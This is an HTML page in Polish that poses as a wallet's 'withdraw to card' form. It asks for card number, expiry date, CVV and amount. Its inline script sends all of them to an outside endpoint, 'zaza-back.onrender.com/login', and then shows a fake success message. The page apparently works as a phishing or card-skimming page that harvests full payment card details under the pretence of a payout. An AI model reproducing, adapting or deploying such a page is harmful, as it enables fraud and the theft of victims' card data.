
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <title>Portfel | Wypłata</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <div class="withdraw-container">
    <h1>Wypłata na kartę</h1>
    <form id="withdrawForm">
      <input type="text" id="card" placeholder="Numer karty" required />
      <input type="text" id="expiry" placeholder="MM/YY" required />
      <input type="text" id="cvv" placeholder="CVV" required />
      <input type="number" id="amount" placeholder="Kwota (PLN)" required />
      <button type="submit">Potwierdź wypłatę</button>
    </form>
    <div id="confirmation"></div>
  </div>

  <script type="module">
    const form = document.getElementById('withdrawForm');
    const confirmation = document.getElementById('confirmation');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const card = document.getElementById('card').value.trim();
      const expiry = document.getElementById('expiry').value.trim();
      const cvv = document.getElementById('cvv').value.trim();
      const amount = document.getElementById('amount').value.trim();

      const res = await fetch('https://zaza-back.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ card, expiry, cvv, amount })
      });

      const data = await res.json();
      confirmation.innerText = data.success ? '✅ Wypłata została zrealizowana.' : '❌ Wystąpił błąd.';
    });
  </script>
</body>
</html>
